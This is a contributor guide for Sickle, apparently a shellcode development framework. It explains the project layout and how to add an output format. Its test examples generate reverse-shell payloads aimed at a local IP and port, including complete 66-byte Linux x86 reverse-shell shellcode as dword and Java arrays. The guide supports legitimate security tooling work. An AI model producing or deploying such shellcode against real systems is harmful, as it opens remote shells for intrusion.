# Contributing to Sickle

First off, thank you for taking the time to contribute to Sickle!

All contributions are welcome, and I kindly ask that you follow a few guidelines specific to this project. To make it easier, I’ve included a *Table of Contents* in this document to help you navigate the contribution process, based on **Sickle v3.1.0**.

Even if you don’t have time to contribute directly, simply using the project is a huge motivator to continue its development.

If you’d like to show your support in other ways, consider:

- Starring the project
- Tweeting about it
- Spreading the word at local meetups
- Becoming a sponsor

Ultimately, the fact that you’re here means you’re already a contributor, and I truly appreciate your support!

# Table of Contents

- [Best Practices](#best-practices)
- [Framework Layout](#framework-layout)
- [Adding a Format](#adding-a-format)
  - [Creating the Format](#creating-the-format)

# Best Practices

As a general rule of thumb follow [PEP8](https://peps.python.org/pep-0008/) for your coding style. However, this is not set in stone so the best thing to do is see how previous modules are structured.

# Framework Layout

The project is continuously evolving, but its overall layout should remain consistent. Depending on your goal, you’ll typically need to focus on just one specific area.

The main directory you'll often be working in is *src/sickle*, within this directory you'll find the following subdirectories.

```
$ ls -l
total 20
-rw-rw-r-- 1 wetw0rk wetw0rk    0 Mar 28 09:54 __init__.py
-rw-rw-r-- 1 wetw0rk wetw0rk  421 Mar 28 09:54 __main__.py
drwxrwxr-x 4 wetw0rk wetw0rk 4096 Mar 28 09:54 common
drwxrwxr-x 2 wetw0rk wetw0rk 4096 Mar 28 09:54 formats
drwxrwxr-x 2 wetw0rk wetw0rk 4096 Mar 28 09:54 modules
drwxrwxr-x 4 wetw0rk wetw0rk 4096 Mar 28 09:54 payloads
```

Let's break this down:

- **common**: This directory contains handlers for Sickle's default operations and "standard libraries" used by payload/development modules. It's very rare you will be modifying contents within this directory as an operator since majority of updates to these files will be new features that affect the whole framework or simply bug fixes.

- **formats**: This is where all formats supported by Sickle are stored (e.g *c, java, python*). Should you be using a custom wrapper in a new language not supported by Sickle this is where you would add it.

- **modules**: This is where all development modules are stored, not to be confused with payload modules. Here is where new capabilities that assist in shellcode/payload development should be added (e.g *diff, run*).

- **payloads**: This is where actual shellcode stubs should be stored. Depending on what platform you're using is what subdirectory you will use, this also includes architecture. Sickle is organized by platform, architecture, and name. For example if you wanted to add a Windows x86 Reverse Shell, you would place it under ***windows/x86/shell_reverse_tcp.py***.

Often the best way to begin module development, is by copying an existing file and going from there.

# Adding a Format

Sickles current format support can be checked easily by running `sickle.py -l` or simply entering the respective directory.

```
$ sickle -l

...snip...

  Format              Description
  ------              -----------
  c                   Format bytecode for a C application
  java                Format bytecode for Java
  hex                 Format bytecode in hex
  num                 Format bytecode in num format
  powershell          Format bytecode for Powershell
  bash                Format bytecode for bash script (UNIX)
  nasm                Format bytecode for NASM
  raw                 Format bytecode to be written to stdout in raw form
  python3             Format bytecode for Python3
  cs                  Format bytecode for C#
  python              Format bytecode for Python
  uint8array          Format bytecode for Javascript as a Uint8Array directly
  hex_space           Format bytecode in hex, seperated by a space
  dword               Format bytecode in dword
  escaped             Format bytecode for one-liner hex escape paste
  javascript          Format bytecode for Javascript (Blob to send via XHR)
  perl                Format bytecode for Perl
  ruby                Format bytecode for Ruby

$ pwd
/opt/Sickle/src/sickle

$ ls formats
__init__.py  bash.py  c.py  cs.py  dword.py  escaped.py  hex.py  hex_space.py  java.py  javascript.py  nasm.py  num.py  perl.py  powershell.py  python.py  python3.py  raw.py  ruby.py  uint8array.py
```

If this is your first time creating a format I recommend starting with *c.py* as this module is intentionally heavily documented as shown below:

```python
from sickle.common.lib.reversing.marker import analyze_bytes
from sickle.common.lib.generic.convert import from_raw_to_escaped

class FormatModule():

    author           = "wetw0rk"
    format_name      = "c"
    description      = "Format bytecode for a C application"

    def __init__(self, raw_bytes=None, badchars=None, varname=None):
        
        self.raw_bytes = raw_bytes
        self.badchars = badchars
        self.varname = varname

        self.language_info = \
        {
            "single line comment": '//',
            "multi line comment": ["/*", "*/"],
            "opcode escape": "\\x",
            "seperator": "",
        }

    ###
    # get_language_information: Returns information on target language
    ###
    def get_language_information(self):
        
        return self.language_info

    ###
    # get_generated_lines:
    #   Generates bytecode lines to be injected into source code following rules of the target
    #   language. This is useful for when you want to inject shellcode into some source code.
    ###
    def get_generated_lines(self, pinpoint=False, single_line=False):
        
        backup_badchars = self.badchars
        if (pinpoint == False):
            self.badchars = None

        if (single_line != True):
            lines = ["unsigned char {:s}[] = ".format(self.varname)]
        else:
            lines = []

        escaped_bytes = from_raw_to_escaped(self.raw_bytes)
        results = analyze_bytes(self.language_info, escaped_bytes, self.badchars, 14)
        for i in range(len(results)):
            if ((i == (len(results) - 1)) and single_line != True):
                lines += "\"{:s}\";".format(results[i]),
            else:
                lines += "\"{:s}\"".format(results[i]),

        self.badchars = backup_badchars

        return lines
```

## Creating the Format

As previously mentioned the best way to begin is by copying the module (format module to be specific) *c.py* file to the format name you intend to add. For example, say we want to create a format for *mucky* lang (note this is fake language).

```
$ cp c.py mucky.py
```

We can now begin modification of *mucky.py*. The first lines we want to modify are ***6-8*** these lines contain information that will be presented to the user when running `sickle -l`.

```python
  6     author           = "wetw0rk"
  7     format_name      = "mucky"
  8     description      = "Format bytecode for a Mucky application"
```

Next, we want to modify lines ***16-22***. These lines contain information respective to the language. It's important to modify them since modules such as **pinpoint** depend on this information.

```python
 16         self.language_info = \
 17         {
 18             "single line comment": '--- MUCKY [',
 19             "multi line comment": ["MS", "ME"],
 20             "opcode escape": "\\x",
 21             "seperator": "",
 22         }
```

Next, we'll want to modify line ***43**, this line is responsible for how the byte array is instantiated.

```python
 42         if (single_line != True):
 43             lines = ["mucky char {:s}[] = ".format(self.varname)]
 44         else:
 45             lines = []
```

Next, mosify the seperation number on line **48** (proir was 14 for *c.py*). This is responsible for determining the amount of bytes per line.

```python
 48         results = analyze_bytes(self.language_info, escaped_bytes, self.badchars, 15)
```

## Testing the Format

We're now ready to test the format, there are many ways to do this however I will be using the `windows/x64/reflective_pe_tcp` payload currently in development for this example.


```
$ python3 sickle.py -p windows/x64/reflective_pe_tcp LHOST=192.168.81.144 LPORT=1337 -f mucky | head
--- MUCKY [ Bytecode generated by Sickle, size: 2790 bytes
mucky char buf[] = 
"\xe8\xd4\x09\x00\x00\x48\x89\xc7\x48\x83\xec\x08\x48\x81\xec"
"\x00\x03\x00\x00\x49\x89\xe7\x48\xc7\xc2\xe6\x17\x8f\x7b\xe8"
"\xe5\x09\x00\x00\x49\x89\x87\x88\x00\x00\x00\x48\xba\x8e\x4e"
"\x0e\xec\x00\x00\x00\x00\xe8\xcf\x09\x00\x00\x49\x89\x87\x98"
"\x00\x00\x00\x48\xc7\xc2\x9c\x95\x1a\x6e\xe8\xbc\x09\x00\x00"
"\x49\x89\x47\x30\x48\xc7\xc2\xaa\xfc\x0d\x7c\xe8\xac\x09\x00"
"\x00\x49\x89\x87\x10\x01\x00\x00\x48\xc7\xc2\x56\x87\xd9\x53"
"\xe8\x99\x09\x00\x00\x49\x89\x87\x40\x01\x00\x00\x48\xc7\xc2"
"\xdd\x9c\xbd\x72\xe8\x86\x09\x00\x00\x49\x89\x87\x60\x01\x00"

$ python3 sickle.py -p windows/x64/reflective_pe_tcp LHOST=192.168.81.144 LPORT=1337 -f mucky -m pinpoint | head 
"\xe8\xd4\x09\x00\x00"                     --- MUCKY [ call 0x19d9
"\x48\x89\xc7"                             --- MUCKY [ mov rdi, rax
"\x48\x83\xec\x08"                         --- MUCKY [ sub rsp, 8
```

Congratulations, you have successfully added a new format! Please keep in mind this was an extremely simple example. My reccomendation is to look at other formats should this byte sequence not match your target language.

For example `num` and `java` follow an interesting "rule set".

```
$ python3 sickle.py -p linux/x86/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f dword       
0xe3f7db31, 0x6a534353, 0xb0e18902, 0x9380cd66, 0xcd3fb059, 0xf9794980, 0x51a8c068, 0x00026890
0xe1893905, 0x515066b0, 0x8903b353, 0x3180cde1, 0x2f6851c9, 0x6868732f, 0x6e69622f, 0x0bb0e389
0x80

$ python3 sickle.py -p linux/x86/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f java 
// Bytecode generated by Sickle, size: 66 bytes
byte buf[] = new byte[]
{
 (byte) 0x31, (byte) 0xdb, (byte) 0xf7, (byte) 0xe3, (byte) 0x53, (byte) 0x43, (byte) 0x53, (byte) 0x6a,
 (byte) 0x02, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x66, (byte) 0xcd, (byte) 0x80, (byte) 0x93,
 (byte) 0x59, (byte) 0xb0, (byte) 0x3f, (byte) 0xcd, (byte) 0x80, (byte) 0x49, (byte) 0x79, (byte) 0xf9,
 (byte) 0x68, (byte) 0xc0, (byte) 0xa8, (byte) 0x51, (byte) 0x90, (byte) 0x68, (byte) 0x02, (byte) 0x00,
 (byte) 0x05, (byte) 0x39, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x66, (byte) 0x50, (byte) 0x51,
 (byte) 0x53, (byte) 0xb3, (byte) 0x03, (byte) 0x89, (byte) 0xe1, (byte) 0xcd, (byte) 0x80, (byte) 0x31,
 (byte) 0xc9, (byte) 0x51, (byte) 0x68, (byte) 0x2f, (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x68,
 (byte) 0x2f, (byte) 0x62, (byte) 0x69, (byte) 0x6e, (byte) 0x89, (byte) 0xe3, (byte) 0xb0, (byte) 0x0b,
 (byte) 0xcd, (byte) 0x80,
};
```